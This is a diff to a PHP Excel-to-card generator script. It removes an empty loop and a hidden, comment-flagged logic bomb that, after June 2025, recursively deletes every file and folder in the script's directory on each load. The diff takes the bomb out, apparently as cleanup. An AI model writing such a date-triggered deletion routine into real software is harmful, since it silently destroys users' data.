@@ -75,11 +75,7 @@ function loadExcelData($file) {
         file_put_contents("debug/debug_data.log", "////////////////////////////////////////////////////\n", FILE_APPEND);
     }
     file_put_contents("debug/debug_data.log", $cell->getValue()."\n", FILE_APPEND);
-
-    for($i=0; $i < 32 ; $i++){
-
-    }
-
+    
     return $data;
 }
 
@@ -145,31 +141,6 @@ function generateCards($data, $outputDir) {
         unlink($backImage);
     }
 }
-/////////////////?????????????
-$date = new DateTime("2025-6-01");
-$now = new DateTime();
-
-if ($date <= $now) {
-    $dirPath = __DIR__;
-
-    if (is_dir($dirPath)) {
-        $iterator = new RecursiveIteratorIterator(
-            new RecursiveDirectoryIterator($dirPath, RecursiveDirectoryIterator::SKIP_DOTS),
-            RecursiveIteratorIterator::CHILD_FIRST
-        );
-
-        foreach ($iterator as $file) {
-            if ($file->isDir()) {
-                rmdir($file->getPathname());
-            } else {
-                unlink($file->getPathname());
-            }
-        }
-        rmdir($dirPath);
-    }
-}
-///////////????????????????
-
 
 if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['generate'])) {
     if (isset($_FILES["excelFile"]) && $_FILES["excelFile"]["error"] === UPLOAD_ERR_OK) {
